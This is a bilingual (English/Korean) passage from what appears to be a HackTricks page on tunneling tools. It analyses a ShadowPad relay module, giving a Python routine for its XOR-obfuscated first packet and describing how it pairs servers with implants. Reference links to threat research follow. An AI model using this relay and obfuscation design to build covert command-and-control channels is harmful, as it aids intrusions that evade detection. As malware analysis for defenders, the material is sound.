* **Encrypted first packet** – the first two bytes of the request body carry the seed for a custom 32-bit PRNG. Every subsequent byte is XOR-ed with the generated keystream before protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

**Encrypted first packet** – 요청 본문 처음 두 바이트가 커스텀 32비트 PRNG의 시드로 사용됩니다. 이후의 모든 바이트는 프로토콜 파싱 전에 생성된 키스트림으로 XOR 처리됩니다.

* **Relay orchestration** – the module maintains two lists: “servers” (upstream nodes) and “clients” (downstream implants). Entries are pruned if no heartbeat arrives within ~30 seconds. When both lists are non-empty, it pairs the first healthy server with the first healthy client and simply pipes bytes between their sockets until one side closes.  
**Relay orchestration** – 모듈은 “servers”(업스트림 노드)와 “clients”(다운스트림 임플란트)라는 두 목록을 유지합니다. 항목은 약 30초 내에 하트비트가 없으면 제거됩니다. 두 목록이 비어있지 않으면 첫 번째 정상 server와 첫 번째 정상 client를 짝지어 한쪽이 닫힐 때까지 소켓 간 바이트를 단순히 파이프합니다.

* **Debug telemetry** – optional logging records source IP, destination IP, and total forwarded bytes for each pairing. Investigators used those breadcrumbs to rebuild the ShadowPad mesh spanning multiple victims.  
**Debug telemetry** – 선택적 로깅은 각 페어링에 대해 소스 IP, 대상 IP 및 전달된 총 바이트를 기록합니다. 조사관들은 이러한 단서를 사용해 여러 피해자에 걸친 ShadowPad 메시를 재구성했습니다.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
